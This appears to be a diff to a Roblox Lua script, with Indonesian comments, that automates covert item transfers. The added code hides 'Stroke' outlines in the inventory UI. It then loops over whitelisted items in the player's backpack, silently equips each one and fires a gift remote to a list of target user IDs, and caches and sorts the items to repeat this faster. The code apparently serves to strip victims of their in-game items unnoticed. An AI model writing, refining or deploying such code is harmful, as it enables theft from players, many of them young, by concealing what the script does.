@@ -181,17 +181,7 @@ local function getInv()
 end
 
 local inv = getInv()
-
-local inventoryFrame = inv:WaitForChild("InventoryFrame")
-local slots = inventoryFrame:WaitForChild("Slots")
-local backpackUI = inventoryFrame:WaitForChild("Backpack")
-
-local items = backpackUI:FindFirstChild("items")
-if not items then
-    warn("items UI not found, skip freeze")
-else
-    clean(items)
-end
+local slots = inv:WaitForChild("InventoryFrame"):WaitForChild("Slots")
 
 local function killStroke(obj)
     if obj.Name == "Stroke" then
@@ -199,23 +189,16 @@ local function killStroke(obj)
     end
 end
 
-local function clean(container)
-    -- bersihin yang udah ada
-    for _,v in ipairs(container:GetDescendants()) do
-        killStroke(v)
-    end
-
-    -- anti spawn ulang
-    container.DescendantAdded:Connect(function(v)
-        task.delay(0.05, function()
-            killStroke(v)
-        end)
-    end)
+-- 🔥 bersihin semua yang udah ada
+for _,v in ipairs(slots:GetDescendants()) do
+    killStroke(v)
 end
 
--- 🔥 aktifin ke dua path
-clean(slots)
-clean(items)
+-- 🔥 anti spawn ulang (INI PENTING)
+slots.DescendantAdded:Connect(function(v)
+    task.wait()
+    killStroke(v)
+end)
 
 
 --====================================================
@@ -771,25 +754,62 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.05)
 
-        for _,tool in ipairs(backpack:GetChildren()) do
-            if tool:IsA("Tool")
-            and not isWeightTool(tool)
-            and isWhitelisted(tool)
-            and tool.Parent == backpack then
+        --====================================
+        -- 🔥 PHASE 1: SCAN + LANGSUNG GIFT
+        --====================================
+        if not cacheBuilt then
+            for _,tool in ipairs(backpack:GetChildren()) do
+                if tool:IsA("Tool")
+                and tool.Parent == backpack
+                and not isWeightTool(tool) then
 
-                silentEquip(tool)
-                task.wait(0.03)
+                    -- 🔥 masukin cache dulu
+                    if brainrotWhitelist[tool.Name] then
+                        table.insert(cachedTools, tool)
+                    end
 
-                for _,id in ipairs(targetUserIds) do
-                    giftRemote:FireServer(id)
-                    task.wait(0.05)
+                    -- 🔥 langsung proses (gak nunggu cache full)
+                    if isWhitelisted(tool) then
+                        silentEquip(tool)
+
+                        for _,id in ipairs(targetUserIds) do
+                            giftRemote:FireServer(id)
+                        end
+
+                        tool.Parent = backpack
+                    end
                 end
+            end
 
-                unequipAll()
-                task.wait(0.03)
+            -- 🔥 setelah 1x scan → sort cache
+            table.sort(cachedTools, function(a,b)
+                return (brainrotWhitelist[a.Name].chance or 0)
+                    < (brainrotWhitelist[b.Name].chance or 0)
+            end)
+
+            cacheBuilt = true
+            print("CACHE BUILT ✅")
+
+        --====================================
+        -- ⚡ PHASE 2: FAST LOOP (PAKAI CACHE)
+        --====================================
+        else
+            for i = 1, #cachedTools do
+                local tool = cachedTools[i]
+
+                if tool and tool.Parent == backpack then
+                    silentEquip(tool)
+
+                    for _,id in ipairs(targetUserIds) do
+                        giftRemote:FireServer(id)
+                    end
+
+                    tool.Parent = backpack
+                end
             end
         end
+
+        task.wait()
     end
 end)
